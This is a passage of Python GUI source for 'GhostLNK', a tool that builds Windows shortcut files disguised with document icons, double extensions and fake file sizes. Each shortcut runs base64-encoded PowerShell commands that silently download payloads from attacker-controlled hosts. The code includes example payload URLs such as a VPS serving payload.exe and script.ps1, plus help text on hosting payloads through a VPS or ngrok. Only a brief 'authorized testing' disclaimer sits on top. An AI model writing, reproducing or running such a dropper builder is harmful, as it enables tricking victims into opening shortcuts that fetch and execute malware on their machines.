        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        # Examples menu
        examples_menu = menubar.addMenu("URL Examples")
        
        dropbox_action = QAction("📌 Dropbox PDF (with dl=1)", self)
        dropbox_action.triggered.connect(self.load_dropbox_example)
        examples_menu.addAction(dropbox_action)
        
        examples_menu.addSeparator()
        
        vps_file_action = QAction("🖥️ Your VPS - File", self)
        vps_file_action.triggered.connect(lambda: self.load_example_url("http://YOUR-VPS-IP:8000/payload.exe"))
        examples_menu.addAction(vps_file_action)
        
        vps_script_action = QAction("🖥️ Your VPS - Script", self)
        vps_script_action.triggered.connect(lambda: self.load_example_url("http://YOUR-VPS-IP:8000/script.ps1"))
        examples_menu.addAction(vps_script_action)
        
        examples_menu.addSeparator()
        
        github_action = QAction("🐙 GitHub Raw", self)
        github_action.triggered.connect(lambda: self.load_example_url("https://raw.githubusercontent.com/username/repo/branch/file.pdf"))
        examples_menu.addAction(github_action)
        
        ngrok_action = QAction("🌐 NGrok Tunnel", self)
        ngrok_action.triggered.connect(lambda: self.load_example_url("https://your-ngrok-id.ngrok.io/payload.exe"))
        examples_menu.addAction(ngrok_action)
        
        # Debug menu
        debug_menu = menubar.addMenu("Debug")
        
        test_debug_action = QAction("Test Debug Mode (Current URL)", self)
        test_debug_action.triggered.connect(self.test_debug_mode)
        debug_menu.addAction(test_debug_action)
        
        debug_menu.addSeparator()
        
        show_log_action = QAction("Show Console Log", self)
        show_log_action.triggered.connect(lambda: self.console.ensureCursorVisible())
        debug_menu.addAction(show_log_action)
        
        # Help menu
        help_menu = menubar.addMenu("Help")
        
        about_action = QAction("About GhostLNK", self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)
        
        dropbox_help_action = QAction("Dropbox URL Help", self)
        dropbox_help_action.triggered.connect(self.show_dropbox_help)
        help_menu.addAction(dropbox_help_action)
        
        debug_help_action = QAction("Debug Mode Help", self)
        debug_help_action.triggered.connect(self.show_debug_help)
        help_menu.addAction(debug_help_action)
        
        vps_help_action = QAction("Setting up a VPS", self)
        vps_help_action.triggered.connect(self.show_vps_help)
        help_menu.addAction(vps_help_action)
    
    def validate_dropbox_url(self):
        """Validate Dropbox URL and show indicator"""
        url = self.url_input.text().strip()
        if 'dropbox.com' in url.lower():
            if 'dl=1' not in url:
                self.dropbox_indicator.setText("⚠️ Dropbox URL missing 'dl=1'! Add &dl=1 to the end")
                self.dropbox_indicator.setStyleSheet("color: #ff6666; font-weight: bold;")
            else:
                self.dropbox_indicator.setText("✓ Dropbox URL has correct dl=1 parameter")
                self.dropbox_indicator.setStyleSheet("color: #66ff66;")
        else:
            self.dropbox_indicator.setText("")
    
    def load_example_url(self, url):
        """Load an example URL"""
        self.url_input.setText(url)
        self.validate_dropbox_url()
        self.log(f"[✓] Loaded example URL: {url}")
    
    def load_dropbox_example(self):
        """Load the Dropbox example"""
        self.url_input.setText(URLExamples.DROPBOX_EXAMPLE)
        self.validate_dropbox_url()
        self.log("[✓] Loaded Dropbox PDF example with dl=1 parameter")
    
    def show_powershell_command(self):
        """Show the PowerShell command"""
        url = self.url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Warning", "Please enter a URL")
            return
        
        if self.debug_mode_cb.isChecked():
            ps_command = PowerShellConverter.url_to_powershell_with_debug(url, self.pause_after_cb.isChecked())
            self.log("[DEBUG] Generated debug PowerShell command with verbose output")
        else:
            ps_command = PowerShellConverter.url_to_powershell_command(url)
            self.log("[*] Generated standard PowerShell command")
        
        self.ps_command_display.setText(ps_command)
    
    def encode_url_to_powershell(self):
        """Encode URL to PowerShell -E format"""
        url = self.url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Warning", "Please enter a URL")
            return
        
        # Validate Dropbox
        is_dropbox, msg = PowerShellConverter.validate_dropbox_url(url)
        if not is_dropbox:
            reply = QMessageBox.question(self, "Dropbox Warning", 
                                        f"{msg}\n\nThe download may fail. Do you want to continue?",
                                        QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            if reply == QMessageBox.StandardButton.No:
                return
        
        # Generate PowerShell command based on debug mode
        if self.debug_mode_cb.isChecked():
            ps_command = PowerShellConverter.url_to_powershell_with_debug(url, self.pause_after_cb.isChecked())
            self.log("[DEBUG] Generated debug PowerShell command with verbose output")
        else:
            ps_command = PowerShellConverter.url_to_powershell_command(url)
            self.log("[*] Generated standard PowerShell command")
        
        self.ps_command_display.setText(ps_command)
        
        # Encode to base64
        encoded = PowerShellConverter.encode_powershell_command(ps_command)
        self.base64_display.setText(encoded)
        
        # Create full argument
        full_arg = f"-E {encoded}"
        self.full_arg_display.setText(full_arg)
        
        # Log the size
        self.log(f"[+] Encoded size: {len(encoded)} characters")
        if self.debug_mode_cb.isChecked():
            self.log("[DEBUG] Debug payload is larger due to verbose output")
        
        # Add to recent
        conversion = {
            'url': url,
            'ps_command': ps_command[:100] + "..." if len(ps_command) > 100 else ps_command,
            'encoded': encoded[:50] + "...",
            'full_arg': full_arg[:50] + "...",
            'debug': self.debug_mode_cb.isChecked(),
            'timestamp': datetime.now().isoformat()
        }
        self.recent_conversions.append(conversion)
        self.update_recent_list()
        self.save_config()
        
        self.log(f"[✓] Successfully converted URL to PowerShell -E format")
    
    def test_debug_mode(self):
        """Test debug mode without generating LNK"""
        url = self.url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Warning", "Please enter a URL")
            return
        
        # Generate debug command
        ps_command = PowerShellConverter.url_to_powershell_with_debug(url, True)
        
        # Show what would happen
        self.log("=" * 60)
        self.log("[👻 DEBUG MODE TEST]")
        self.log(f"[*] URL: {url}")
        self.log(f"[*] Debug command length: {len(ps_command)} characters")
        
        if 'dropbox.com' in url.lower():
            if 'dl=1' in url:
                self.log("[✓] Dropbox URL has correct dl=1 parameter")
            else:
                self.log("[⚠️] Dropbox URL missing dl=1! Add &dl=1")
        
        self.log("[*] When executed, the PowerShell window will:")
        self.log("    - Show URL connection test")
        self.log("    - Display download progress")
        self.log("    - Show file details after download")
        self.log("    - Wait for key press before closing")
        self.log("=" * 60)
        
        QMessageBox.information(self, "Debug Mode Test", 
                              "Debug mode will show detailed output in the PowerShell window.\n"
                              "The window will remain open until you press a key.\n\n"
                              "Check the console for more details.")
    
    def copy_full_argument(self):
        """Copy full -E argument to clipboard"""
        full_arg = self.full_arg_display.toPlainText().strip()
        if not full_arg:
            QMessageBox.warning(self, "Warning", "No argument to copy")
            return
        
        clipboard = QApplication.clipboard()
        clipboard.setText(full_arg)
        
        arg_len = len(full_arg)
        self.log(f"[✓] Copied to clipboard: {arg_len} characters")
        
        # Also set it in the quick import field
        self.quick_arg_input.setText(full_arg)
    
    def use_converted_in_lnk(self):
        """Use the converted argument in LNK generator"""
        full_arg = self.full_arg_display.toPlainText().strip()
        if not full_arg:
            QMessageBox.warning(self, "Warning", "No converted argument to use")
            return
        
        self.quick_arg_input.setText(full_arg)
        self.current_arg_label.setText(f"Arguments: {full_arg[:150]}...")
        self.log("[✓] Loaded converted argument into LNK generator")
        
        if self.debug_mode_cb.isChecked():
            self.log("[DEBUG] Debug mode enabled - LNK will show verbose output")
    
    def import_from_converter(self):
        """Import argument from quick input"""
        arg = self.quick_arg_input.text().strip()
        if not arg:
            QMessageBox.warning(self, "Warning", "No argument to import")
            return
        
        self.current_arg_label.setText(f"Arguments: {arg[:150]}...")
        self.log("[✓] Imported argument into LNK generator")
    
    def decode_existing(self):
        """Decode an existing -E argument"""
        encoded = self.decode_input.toPlainText().strip()
        if not encoded:
            QMessageBox.warning(self, "Warning", "No argument to decode")
            return
        
        decoded = PowerShellConverter.decode_powershell_argument(encoded)
        if decoded:
            self.decode_output.setText(decoded)
            
            # Detect if it's debug mode
            if "GhostLNK Debug Mode" in decoded:
                self.decode_output.append("\n[!] This appears to be a DEBUG mode payload")
            
            # Extract URL
            url_match = re.search(r"https?://[^\s'\"]+", decoded)
            if url_match:
                self.decode_output.append(f"\n[+] Extracted URL: {url_match.group(0)}")
            
            self.log("[✓] Successfully decoded -E argument")
        else:
            self.decode_output.setText("Failed to decode - invalid base64 or encoding")
            self.log("[-] Failed to decode argument")
    
    def use_recent_conversion(self, item):
        """Use a recent conversion"""
        index = self.recent_list.row(item)
        if 0 <= index < len(self.recent_conversions):
            conv = self.recent_conversions[-(index + 1)]
            QMessageBox.information(self, "Recent Conversion", 
                                  f"URL: {conv.get('url', 'Unknown')}\n\n"
                                  f"Debug mode: {conv.get('debug', False)}\n"
                                  f"Time: {conv.get('timestamp', 'unknown')}\n\n"
                                  f"Please re-encode to get the full payload.")
    
    def update_recent_list(self):
        """Update the recent conversions list"""
        self.recent_list.clear()
        for conv in reversed(self.recent_conversions[-10:]):
            short_url = conv['url'][:40] + "..." if len(conv['url']) > 40 else conv['url']
            debug_tag = " [DEBUG]" if conv.get('debug', False) else ""
            self.recent_list.addItem(f"{short_url}{debug_tag}")
    
    def clear_recent(self):
        """Clear recent conversions"""
        self.recent_conversions = []
        self.update_recent_list()
        self.save_config()
        self.log("[*] Cleared recent conversions")
    
    def generate_description(self):
        """Generate a realistic file description"""
        current_date = datetime.now().strftime("%d/%m/%Y %H:%M")
        icon_type = self.icon_combo.currentText()
        
        import random
        sizes = [
            "1.23 MB (1,289,000 bytes)",
            "2.45 MB (2,569,000 bytes)",
            "856 KB (876,544 bytes)",
            "4.12 MB (4,321,000 bytes)",
            "512 KB (524,288 bytes)"
        ]
        fake_size = random.choice(sizes)
        
        description = f"Type: {icon_type}\nSize: {fake_size}\nDate modified: {current_date}"
        self.description_input.setText(description)
        self.log("[✓] Generated realistic file description")
    
    def save_console_log(self):
        """Save console log to file"""
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save Console Log", f"ghostlnk_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", 
            "Text Files (*.txt)"
        )
        if file_path:
            with open(file_path, 'w') as f:
                f.write(self.console.toPlainText())
            self.log(f"[✓] Console log saved to: {file_path}")
    
    def log(self, message):
        """Log a message to the console with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.append(f"[{timestamp}] {message}")
        cursor = self.console.textCursor()
        cursor.movePosition(cursor.MoveOperation.End)
        self.console.setTextCursor(cursor)
        QApplication.processEvents()
    
    def generate_lnk(self):
        """Generate the LNK file"""
        try:
            # Get the argument
            arg = self.quick_arg_input.text().strip()
            if not arg:
                arg = self.full_arg_display.toPlainText().strip()
            
            if not arg:
                QMessageBox.warning(self, "Warning", "No PowerShell argument set")
                return
            
            # Get icon settings
            icon_type = self.icon_combo.currentText()
            icon_path, icon_index, ext = self.ICON_DATABASE[icon_type]
            
            # Build filename
            base_name = self.filename_base.text().strip() or "Document"
            selected_ext = self.filename_ext.currentText()
            output_filename = f"{base_name}_{datetime.now().strftime('%Y%m%d')}{selected_ext}"
            
            if self.add_lnk_cb.isChecked():
                output_filename += ".lnk"
            else:
                output_filename = output_filename.replace(selected_ext, ".lnk")
            
            # Get description
            description = self.description_input.toPlainText().strip()
            if not description:
                self.generate_description()
                description = self.description_input.toPlainText().strip()
            
            # Ask for save location
            save_path, _ = QFileDialog.getSaveFileName(
                self, "Save GhostLNK File", output_filename, "LNK Files (*.lnk)"
            )
            
            if not save_path:
                self.log("[-] Generation cancelled")
                return
            
            # Generate the LNK
            self.log("👻 Generating GhostLNK file...")
            
            self.log(f"[*] Target: powershell.exe")
            if self.debug_mode_cb.isChecked():
                self.log("[*] Mode: DEBUG (verbose output, window will stay open)")
            else:
                self.log("[*] Mode: STANDARD (silent execution)")
            
            LNKEngine.create_lnk(
                output_filename=save_path,
                target_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                arguments=arg,
                icon_path=icon_path,
                icon_index=icon_index,
                description=description
            )
            
            file_size = os.path.getsize(save_path)
            self.log(f"[✓] GhostLNK created successfully!")
            self.log(f"[✓] Saved to: {save_path}")
            self.log(f"[✓] File size: {file_size} bytes")
            
            if self.debug_mode_cb.isChecked():
                self.log("\n[DEBUG INFO]")
                self.log("When double-clicked, PowerShell will:")
                self.log("- Show detailed connection test")
                self.log("- Display download progress")
                self.log("- Show file information after download")
                self.log("- Wait for key press before closing")
            
            QMessageBox.information(
                self, "Success", 
                f"GhostLNK file generated successfully!\n\nSaved to:\n{save_path}\n\n"
                f"Mode: {'DEBUG' if self.debug_mode_cb.isChecked() else 'STANDARD'}"
            )
            
            self.save_config()
            
        except Exception as e:
            self.log(f"❌ Error: {str(e)}")
            QMessageBox.critical(self, "Error", f"Failed to generate LNK: {str(e)}")
    
    def load_config_dialog(self):
        """Load configuration from file"""
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Load Configuration", "", "JSON Files (*.json)"
        )
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    config = json.load(f)
                    if 'recent_urls' in config:
                        self.recent_urls = config['recent_urls']
                    if 'recent_conversions' in config:
                        self.recent_conversions = config['recent_conversions']
                        self.update_recent_list()
                    self.log(f"[✓] Loaded configuration from {file_path}")
            except Exception as e:
                self.log(f"[-] Failed to load config: {e}")
                QMessageBox.critical(self, "Error", f"Failed to load config: {e}")
    
    def show_dropbox_help(self):
        """Show Dropbox URL help"""
        help_text = """
        <h3>📌 Dropbox URL Guide</h3>
        
        <p><b>Why dl=1 is important:</b></p>
        <ul>
        <li>Dropbox shared links normally open a preview page</li>
        <li>Adding <code>?dl=1</code> or <code>&dl=1</code> forces direct download</li>
        <li>Without it, you'll download an HTML page, not your file</li>
        </ul>
        
        <p><b>Example Dropbox URL formats:</b></p>
        <pre style="background-color:#16213e; padding:10px;">
        ❌ Wrong: https://www.dropbox.com/s/abc123/file.pdf
        ✅ Right: https://www.dropbox.com/s/abc123/file.pdf?dl=1
        
        ❌ Wrong: https://www.dropbox.com/scl/fi/abc123/file.pdf?rlkey=xyz
        ✅ Right: https://www.dropbox.com/scl/fi/abc123/file.pdf?rlkey=xyz&dl=1
        </pre>
        
        <p><b>How to get the right URL:</b></p>
        <ol>
        <li>Share a file from Dropbox</li>
        <li>Copy the shared link</li>
        <li>Add <code>&dl=1</code> to the end</li>
        <li>Test with <code>wget URL</code> to ensure you get the file, not HTML</li>
        </ol>
        
        <p><b>Example working URL:</b><br>
        <code>https://www.dropbox.com/scl/fi/6z4ogo404tOtr/file_name?rlkey=rl63zpok5gork304fw23&dl=1</code></p>
        """
        QMessageBox.about(self, "Dropbox URL Help", help_text)
    
    def show_vps_help(self):
        """Show VPS setup help"""
        help_text = """
        <h3>🖥️ Setting up a VPS for Payload Hosting</h3>
        
        <p><b>Quick Python HTTP Server:</b></p>
        <pre style="background-color:#16213e; padding:10px;">
        # Python 3
        python3 -m http.server 8000
        
        # Python 2
        python -m SimpleHTTPServer 8000
        
        # With specific directory
        cd /path/to/payloads
        python3 -m http.server 8000
        </pre>
        
        <p><b>Example URLs after starting server:</b></p>
        <ul>
        <li><code>http://YOUR-VPS-IP:8000/payload.exe</code></li>
        <li><code>http://YOUR-VPS-IP:8000/script.ps1</code></li>
        <li><code>http://YOUR-VPS-IP:8000/document.pdf</code></li>
        </ul>
        
        <p><b>Using ngrok to expose local server:</b></p>
        <pre style="background-color:#16213e; padding:10px;">
        # Install ngrok
        # Start local server
        python3 -m http.server 8000
        
        # In another terminal
        ngrok http 8000
        
        # Copy the ngrok URL (https://abc123.ngrok.io)
        </pre>
        
        <p><b>Testing your URL:</b></p>
        <pre style="background-color:#16213e; padding:10px;">
        # Check if file is accessible
        curl -I http://YOUR-VPS-IP:8000/payload.exe
        
        # Download test
        wget http://YOUR-VPS-IP:8000/payload.exe
        </pre>
        
        <p><b>Important Notes:</b></p>
        <ul>
        <li>Open firewall port (8000) if needed</li>
        <li>Use HTTPS for production (Let's Encrypt)</li>
        <li>Monitor access logs: <code>tail -f /var/log/nginx/access.log</code></li>
        </ul>
        """
        QMessageBox.about(self, "VPS Setup Help", help_text)
    
    def show_debug_help(self):
        """Show debug mode help"""
        help_text = """
        <h3>👻 GhostLNK Debug Mode Help</h3>
        
        <p><b>What Debug Mode does:</b></p>
        <ul>
        <li>✅ Shows URL connection test before downloading</li>
        <li>✅ Displays HTTP status code (200 = success)</li>
        <li>✅ Shows content-type and content-length</li>
        <li>✅ Shows download start/end times</li>
        <li>✅ Displays file size after download</li>
        <li>✅ Shows file header in hex (for file type verification)</li>
        <li>✅ Identifies file type by header (PDF, EXE, ZIP, JPG)</li>
        <li>✅ Shows detailed error messages with troubleshooting tips</li>
        <li>✅ Window stays open until you press a key</li>
        </ul>
        
        <p><b>When to use Debug Mode:</b></p>
        <ul>
        <li>🔍 Testing if a URL is accessible</li>
        <li>🔍 Troubleshooting download failures</li>
        <li>🔍 Verifying file was saved correctly</li>
        <li>🔍 Learning what the payload actually does</li>
        <li>🔍 Debugging Dropbox URL issues (missing dl=1)</li>
        </ul>
        
        <p><b>Error Messages Explained:</b></p>
        <ul>
        <li><b>404 Not Found:</b> File doesn't exist - Check URL</li>
        <li><b>403 Forbidden:</b> Server blocking automated downloads</li>
        <li><b>500 Server Error:</b> Server-side issue</li>
        <li><b>Timeout:</b> Connection too slow or server down</li>
        </ul>
        
        <p><b>Note:</b> Debug mode makes the payload much larger (more base64 characters)
        but provides invaluable troubleshooting information!</p>
        """
        QMessageBox.about(self, "GhostLNK Debug Mode Help", help_text)
    
    def show_about(self):
        """Show about dialog"""
        about_text = """
        <h1>👻 GhostLNK v1.0</h1>
        <h3>The Stealth URL to PowerShell LNK Converter</h3>
        
        <p><b>Features:</b></p>
        <ul>
        <li>🔮 Convert any URL to PowerShell -E format</li>
        <li>📋 Built-in URL examples (Dropbox, VPS, GitHub, ngrok)</li>
        <li>🐛 Advanced Debug Mode with verbose output</li>
        <li>📌 Dropbox URL validation with dl=1 checking</li>
        <li>⏸️ Optional pause after execution</li>
        <li>📊 Real-time download progress in debug mode</li>
        <li>🔍 URL accessibility testing</li>
        <li>📁 File header analysis (PDF, EXE, ZIP detection)</li>
        <li>🎭 Multiple icon disguises (PDF, DOC, XLS, etc.)</li>
        <li>📝 Automatic realistic description generation</li>
        </ul>
        
        <p><b>Example URLs included:</b></p>
        <ul>
        <li>📌 Dropbox PDF with dl=1 parameter</li>
        <li>🖥️ Your VPS - File hosting</li>
        <li>🖥️ Your VPS - PowerShell scripts</li>
        <li>🐙 GitHub Raw files</li>
        <li>🌐 ngrok tunnels</li>
        <li>📁 Direct file servers</li>
        </ul>
        
        <p><b>⚠️ Legal Disclaimer:</b></p>
        <p>This tool is for educational and authorized testing purposes only.<br>
        Users are responsible for complying with all applicable laws.</p>
        
        <p><b>Version:</b> 1.0<br>
        <b>Release Date:</b> 2026<br>
        <b>Author:</b> Ghost Security Research</p>
        
        <p><i>"In the shadows, we test security"</i></p>
        """
        QMessageBox.about(self, "About GhostLNK", about_text)


def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    
    window = GhostLNKGUI()
    window.show()
    
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
